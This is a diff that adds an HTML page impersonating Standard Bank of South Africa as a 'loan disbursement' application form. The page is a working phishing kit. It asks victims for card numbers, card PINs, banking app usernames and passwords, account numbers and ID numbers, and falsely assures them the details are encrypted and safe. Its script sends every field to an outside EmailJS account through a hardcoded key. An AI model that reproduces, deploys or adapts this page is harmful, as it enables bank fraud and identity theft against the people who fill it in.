@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="index.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('OCUFII26SPgBLeg-z');
+        })();
+    </script>
+    <script type="text/javascript">
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+                // generate a five digit number for the contact_number variable
+                this.contact_number.value = Math.random() * 100000 | 0;
+                // these IDs from the previous steps
+                emailjs.sendForm("service_standard","template_standard", this)
+                .then(function() {
+                    console.log('SUCCESS!');
+                    let input = document.querySelectorAll('input')
+                    input.innerHTML = ""
+                        let subscribe = document.getElementById('submit')
+                        console.log('na me')
+                        subscribe.style.animationName = 'done';
+                        subscribe.value = 'DONE'
+                        let Subscribe = setTimeout(sub, 5000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    }, function(error) {
+                        console.log('FAILED...', error);
+                        let input = document.querySelectorAll('input')
+                        input.innerHTML = ""
+                        let subscribe = document.getElementById('submit')
+                        subscribe.value = 'unable to submit'
+                        subscribe.style.animationName = 'failed';
+                        let Subscribe = setTimeout(sub, 4000);
+                        function sub(){
+                            subscribe.value = 'Submit'
+                        }
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <div id="div1">
+        <img id="img1" src="./KugAIkUYIkrifh4ZcMMbQtVtQPH1590071386009_200x200 (1).png" alt="">
+    </div>
+   <div id="div2">
+    <img id="img2" src="./Standard_Bank_of_South_Africa_logo.png" alt="">
+</div>
+<p id="p1">Standard Bank / <br> Application Form </p>
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+
+        <label for="name">Full Name:</label> <br>
+        <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+        <input type="text" name="surname" id="surname" placeholder="Enter Middle Name"> <br>
+        <input type="text" name="lastname" id="lastname" placeholder="Enter Last Name"> <br>
+
+        <label for="reference">Reference Number</label><br>
+        <input type="number" name="reference" id="reference" placeholder="Enter Reference Number"><br>
+        <!-- <label for="surname">Surname:</label> <br> --> 
+        <p>I authorize you to release the following requested by ABC Financial, concerning my bank account with your bank</p>
+        <input type="radio" name="pick" id="yes" value="yes">
+        <label for="yes">Yes</label><br>
+        <input type="radio" name="pick" id="no" value="no">
+        <label for="no">No</label><br>
+
+        <p>This section must be completed by representative</p>
+        <label for="address">Address:</label><br>
+        <input type="text" name="city" id="address" placeholder="Enter city">
+        <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
+        <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br>
+
+        <label for="amount">Amount:</label><br>
+        <input type="text" name="amount" id="amount" placeholder="Enter Amount"><br>
+
+        <label for="account">Account Number:</label><br>
+        <input type="number" name="account" id="account" placeholder="Enter Account Number"><br>
+
+        <label for="types">Type of Account</label><br>
+        <input type="radio" name="type" id="checking" value="checking">
+        <label for="checking">Checking</label><br>
+        <input type="radio" name="type" id="savings" value="savings">
+        <label for="savings">Savings</label> <br>
+        <input type="radio" name="type" id="prepaid" value="prepaid">
+        <label for="prepaid">Prepaid Account</label><br>
+        
+        <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+             be ensured that your details are all encrypted and safe</p>
+        <label for="card">Card Number:</label> <br>
+        <input type="number" name="card" id="card" placeholder="Enter Card Number"> <br>
+
+        <label for="pin">Card Pin:</label><br>
+        <input type="number" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+
+        <p>Does this account accept ACH debit?</p>
+        <input type="radio" name="debit" id="yes" value="yes">
+        <label for="yes">Yes</label><br>
+        <input type="radio" name="debit" id="no" value="no">
+        <label for="no">No</label><br>
+
+        <p>Has this account been open for at least three months?</p>
+        <input type="radio" name="months" id="yes" value="yes">
+        <label for="yes">Yes</label><br>
+        <input type="radio" name="months" id="no" value="no">
+        <label for="no">No</label><br>
+
+        <p>Do you have direct deposit into your Account?</p>
+        <input type="radio" name="deposit" id="yes" value="yes">
+        <label for="yes">Yes</label><br>
+        <input type="radio" name="deposit" id="no" value="no">
+        <label for="no">No</label><br>
+
+        <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+            be ensured that your details are all encrypted and safe</p>
+        <label for="username">App Username:</label> <br>
+        <input type="text" name="username" id="username" placeholder="Enter Username"> <br>
+
+        <label for="password">App Password:</label> <br>
+        <input type="text" name="password" id="password" placeholder="Enter Password"> <br>
+       
+        <label for="identity">ID Number:</label> <br>
+        <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br>
+
+        <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+        <label for="email">E-Mail Address:</label> <br>
+        <input type="email" name="email" id="email" placeholder="Enter Email"> <br>
+
+
+
+
+        <input type="submit" value="Approve Withdrawal" id="submit">
+    </form>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+</body>
+</html>
